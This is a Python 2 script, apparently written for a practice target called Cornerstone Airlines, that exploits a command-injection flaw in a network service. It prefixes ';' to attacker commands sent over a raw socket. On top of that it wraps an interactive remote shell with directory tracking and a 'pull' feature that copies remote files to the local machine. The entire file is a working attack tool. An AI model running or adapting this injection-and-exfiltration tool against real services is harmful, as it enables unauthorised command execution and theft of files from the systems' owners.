import socket
import re

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    s.recv(2048) # Grab cornerstone airlines ASCII art and prompt
    s.send(";" + cmd + "\n")
    data = s.recv(2048)

    return data

def back_one_directory(directory):
    if directory == "/":
        return directory
    else:
        return re.match(r'^(.*)\/[\w]+\/$', directory).group(1) + "/"

def pull_file(remote_path, local_path):
    remote_file_contents = execute_cmd("cat " + remote_path)

    local_file = open(local_path, 'w')
    local_file.write(remote_file_contents)
    local_file.close()

if __name__ == '__main__':

    command = raw_input("$")


    while(command != "quit"):
        if command == "shell":
            current_directory = "/"
            command = raw_input("/>")

            while (command != "exit" and command != "quit"):
                if re.match(r'^cd ', command):
                    if re.match(r'^cd ..$', command):
                        current_directory = back_one_directory(current_directory)
                    else:
                        current_directory = current_directory + re.match(r'^cd ([\/\w\.]+)$', command).group(1) + "/"
                else:
                    print(execute_cmd("cd " + current_directory + " && " + command))

                command = raw_input(current_directory + ">")

        elif re.match(r'^pull [\w\/\.]+ [\w\/\.]+$', command):
            pullMatch = re.match(r'^pull ([\w\/\.]+) ([\w\/\.]+)$', command)

            pull_file(pullMatch.group(1), pullMatch.group(2))

        elif command == "help":
            print("\"shell\" Drop into an interactive shell and allow users to gracefully exit \n" +
                  "\"pull <remote-path> <local-path>\" Download files \n" +
                  "\"help\" Shows this help menu \n" +
                  "\"quit\" Quit the shell")
        else:
            print("Input provided was invalid. Try these commands:\n" +
                  "\"shell\" Drop into an interactive shell and allow users to gracefully exit \n" +
                  "\"pull <remote-path> <local-path>\" Download files \n" +
                  "\"help\" Shows this help menu \n" +
                  "\"quit\" Quit the shell")

        command = raw_input("$")